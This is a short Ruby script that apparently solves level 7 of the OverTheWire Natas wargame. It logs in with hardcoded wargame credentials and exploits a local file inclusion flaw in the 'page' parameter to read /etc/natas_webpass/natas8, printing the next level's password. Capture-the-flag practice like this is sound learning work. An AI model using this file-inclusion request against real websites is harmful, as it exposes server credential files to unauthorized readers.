#!/usr/bin/ruby
require "net/http"

username = "natas7"
password = "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"

url = URI.parse "http://%s.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8" % [username]
client = Net::HTTP.new url.host, url.port

req = Net::HTTP::Get.new url
req.basic_auth username, password

print (client.request req).body